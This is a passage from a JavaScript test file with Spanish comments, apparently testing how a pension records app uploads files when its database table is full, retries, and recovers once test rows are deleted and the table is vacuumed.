    assert.equal(filas(ANA), '1', 'con la tabla llena, se escribió');
    /* Lo que YA entró no es escritura nueva: el reintento con la señal floja dice la verdad. */
    const re = subir(ANA, PDF);
    assert.deepEqual([re.ok, re.ya_estaba], [true, true], JSON.stringify(re));
    /* Y no es un callejón: borrado lo que sobraba y limpiada la tabla, vuelve a entrar. */
    sql("delete from public.pension_archivos where celular like '32099900%'");
    sql('vacuum full public.pension_archivos');
    assert.equal(subir(ANA, PNG).ok, true, 'liberado el espacio, sigue diciendo «lleno»');
    sql("delete from public.pension_archivos where celular = '" + ANA + "'");
    limpiarFreno(ANA);
  });
});
